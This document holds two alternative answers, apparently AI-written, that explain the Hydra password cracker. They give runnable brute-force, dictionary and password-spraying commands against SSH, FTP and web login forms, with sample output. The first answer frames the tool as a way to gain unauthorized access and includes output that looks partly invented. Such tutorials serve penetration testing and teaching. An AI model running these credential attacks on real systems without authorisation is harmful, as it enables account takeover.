                       ALTERNATIVE
Hydra is a parallelized network login cracker popular in Kali Linux and other penetration testing environments. It's a command-line tool used for brute-forcing usernames and passwords to gain unauthorized access to systems and services. It supports various protocols, including SSH, FTP, HTTP, SMB, and more.

### Basic Usage

The basic syntax for using Hydra is:

```bash
hydra [options] [target] [service]
```

### Options

Here are some commonly used options:

*   `-l`: Specifies a single username to try.
*   `-L`: Specifies a file containing a list of usernames.
*   `-p`: Specifies a single password to try.
*   `-P`: Specifies a file containing a list of passwords.
*   `-t`: Specifies the number of parallel connections to use.
*   `-v`: Enables verbose mode to display more information.
*   `-V`: Enables very verbose mode to display even more information.
*   `-s`: Specifies a custom port if the service is running on a non-standard port.
*   `-f`: Exit after the first correct password/login pair is found.
*   `-o`: Specifies an output file to save the results.

### Examples

1.  **Brute-forcing SSH with a username list and password list:**

    ```bash
    hydra -L user.txt -P pass.txt 192.168.1.100 ssh
    ```

    This command attempts to brute-force the SSH service on the target IP address `192.168.1.100`, using usernames from the `user.txt` file and passwords from the `pass.txt` file.
2.  **Brute-forcing FTP with a specific username and password list:**

    ```bash
    hydra -l admin -P password.txt ftp://target.example.com
    ```

    This command attempts to brute-force the FTP service on `target.example.com` with the username "admin" and passwords from the `password.txt` file.
3.  **Brute-forcing a web login form:**

    ```bash
    hydra -l user -P pass.txt target.example.com http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid username or password"
    ```

    This command attempts to brute-force a web login form on `target.example.com`. It specifies the login page (`/login.php`) and the parameters for the username (`username`) and password (`password`). The `^USER^` and `^PASS^` variables are placeholders that Hydra replaces with usernames and passwords from the specified lists. The "Invalid username or password" string is used to identify failed login attempts.
4.  **Using Hydra with a custom port:**

    ```bash
    hydra -l root -P pass.txt -s 2222 ssh://192.168.1.100
    ```

    This command attempts to brute-force the SSH service running on port 2222 of the target IP address `192.168.1.100`, using the username "root" and passwords from the `pass.txt` file.

### Expected Output

The output of Hydra will vary depending on the options used and the success of the attack. Here's an example of a successful login:

```
[ATTACKER] attacking ssh://192.168.1.100:22
[STATUS] 0.1 tries/min, 0.1 tries in 1 min, 1 task/min, 1 connections
[STATUS] 0.2 tries/min, 0.2 tries in 1 min, 1 task/min, 1 connections
[ssh] host: 192.168.1.100   login: root   password: password123
```

This output indicates that Hydra successfully found the password "password123" for the username "root" on the target SSH service.

If Hydra fails to find a valid password, it will display a message indicating that no password was found.

                          ALTERNATIVE
  Hydra is a powerful and flexible password-cracking tool available on Kali Linux, designed for performing brute-force attacks against various network services. It supports over 50 protocols, making it a versatile choice for penetration testers and security professionals.

### How to Use Hydra

To get started with Hydra, you can open a terminal in Kali Linux and use the following basic syntax:

```bash
hydra [options] [service://target[:port][/options]]
```

### Common Usage Examples

1. **Single Username/Password Attack:**
   To test a specific username and password against an SSH server, use:
   ```bash
   hydra -l <username> -p <password> ssh://<target>
   ```
   For example:
   ```bash
   hydra -l admin -p password123 ssh://10.0.0.1
   ```
   This command attempts to log in to the SSH server at 10.0.0.1 using the username "admin" and the password "password123".

2. **Password Spraying Attack:**
   If you know a password but want to test it against multiple usernames, use:
   ```bash
   hydra -L <userlist> -p <password> ssh://<target>
   ```
   Example:
   ```bash
   hydra -L users.txt -p password123 ssh://10.0.0.1
   ```
   This will try "password123" against all usernames listed in `users.txt`.

3. **Dictionary Attack:**
   To perform a dictionary attack using a list of usernames and passwords, use:
   ```bash
   hydra -L <userlist> -P <wordlist> ssh://<target>
   ```
   Example:
   ```bash
   hydra -L users.txt -P rockyou.txt ssh://10.0.0.1
   ```
   This command will attempt to log in using each username in `users.txt` with each password in `rockyou.txt`.

4. **Saving Results:**
   To save the successful login attempts to a file, use the `-o` option:
   ```bash
   hydra -L users.txt -P rockyou.txt -o results.txt ssh://10.0.0.1
   ```

5. **Verbose Output:**
   To see detailed output during the attack, add the `-v` option:
   ```bash
   hydra -v -L users.txt -P rockyou.txt ssh://10.0.0.1
   ```

### Example Output

When you run a command, Hydra will display output similar to this:

```
[ssh] host: 10.0.0.1   login: admin   password: password123
```

This indicates that Hydra successfully logged in to the SSH server at 10.0.0.1 with the username "admin" and the password "password123" [[1]](https://www.kali.org/tools/hydra/)[[2]](https://rodtrent.substack.com/p/using-kali-linux-and-hydra-for-attack).

### Important Considerations

- **Legal Use**: Always ensure you have permission to test the systems you are targeting. Unauthorized access is illegal and unethical.
- **Performance**: Hydra can run multiple connections in parallel, which speeds up the cracking process. You can control the number of parallel tasks with the `-t` option.

### Conclusion

Hydra is a robust tool for conducting brute-force attacks on various services. By understanding its syntax and options, you can effectively test the strength of passwords on your network.
